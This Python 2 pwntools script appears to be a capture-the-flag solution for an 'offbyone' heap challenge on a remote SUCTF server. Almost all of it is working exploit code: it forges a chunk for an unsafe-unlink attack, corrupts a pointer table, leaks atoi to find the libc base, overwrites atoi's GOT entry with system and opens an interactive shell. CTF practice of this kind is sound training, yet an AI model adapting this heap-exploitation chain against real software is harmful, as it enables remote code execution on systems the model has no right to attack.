# coding:utf-8
#!/usr/bin/env python2
import copy
from ctypes import *
from pwn import *
elf = ELF('./offbyone')
libc = ELF("/home/moonagirl/moonagirl/libc/libc_local_x64")
LOCAL = 0
if LOCAL:
    p = process('./offbyone')#,env={"LD_PRELOAD":"./libc-2.24.so"})
    context.log_level = 'debug'
else:
    p = remote('pwn.suctf.asuri.org',20004)#47.104.16.75 8997
#    context.log_level = 'debug'

def z(a=''):
	gdb.attach(p,a)
	if a == '':
		raw_input()

def menu(id):
	p.recvuntil('4:edit\n')
	p.sendline(str(id))

def Alloc(size,content):
	menu(1)
	p.recvuntil('input len\n')
	p.sendline(str(size))
	p.recvuntil('input your data\n')
	p.send(content)

def Show(index):
	menu(3)
	p.recvuntil('input id\n')
	p.sendline(str(index))

def Delete(index):
	menu(2)
	p.recvuntil('input id\n')
	p.sendline(str(index))

def Edit(index,content):
	menu(4)
	p.recvuntil('input id\n')
	p.sendline(str(index))
	p.recvuntil('input your data\n')
	p.send(content)

Alloc(0xf0,'a'*0xf0)#0
Alloc(0xf0,'a'*10)#1
Alloc(0xf0,'a'*10)#2
Alloc(0xf0,'a'*10)#3
Alloc(0xf0,'a'*0xf0)#4
Alloc(0x80,'a'*0x80)#5
Alloc(0x80,'a'*0x80)#6

Delete(3)

Alloc(0xf8,'a'*0xf8)#3


data = p64(0) + p64(0xf0) + p64(0x6020D8 - 0x18) + p64(0x6020D8 - 0x10)
data = data.ljust(0xf0)
data += p64(0xf0)  + '\x00'
Edit(3,data)

Delete(4)

Edit(3,'\x68\x20\x60\x00')

Show(0)

data = u64(p.recv(6).ljust(8,'\x00'))
print 'atoi_addr:' + hex(data)

libc_base = data - libc.symbols['atoi']
system_addr = libc_base + libc.symbols['system']

print 'system_addr:' + hex(system_addr)

print p64(system_addr)[0:6]

Edit(0,p64(system_addr)[0:6])

p.interactive()
#z()


# bss:00000000006020C0 heap_form

    # Arch:     amd64-64-little
    # RELRO:    Partial RELRO
    # Stack:    No canary found
    # NX:       NX enabled
    # PIE:      No PIE (0x400000)
